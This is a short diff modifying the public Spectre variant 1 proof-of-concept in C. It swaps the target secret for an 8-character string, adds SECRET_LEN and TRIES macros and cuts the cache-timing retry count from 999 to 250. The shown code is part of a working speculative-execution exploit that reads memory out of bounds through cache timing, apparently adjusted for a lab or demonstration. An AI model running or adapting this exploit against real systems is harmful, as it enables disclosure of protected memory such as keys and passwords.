@@ -37,7 +37,7 @@ uint8_t array1[160] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char * secret = "The Magic Words are Squeamish Ossifrage.";
+char * secret = "SeCrEt?!";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
@@ -51,6 +51,8 @@ void victim_function(size_t x) {
 Analysis code
 ********************************************************************/
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define SECRET_LEN 8
+#define TRIES 250
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -62,7 +64,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
-  for (tries = 999; tries > 0; tries--) {
+  for (tries = TRIES; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
@@ -130,7 +132,7 @@ int main(int argc,
   /* default for malicious_x */
   size_t malicious_x = (size_t)(secret - (char * ) array1);
 
-  int i, score[2], len = 40;
+  int i, score[2], len = SECRET_LEN;
   uint8_t value[2];
 
   for (i = 0; i < sizeof(array2); i++)
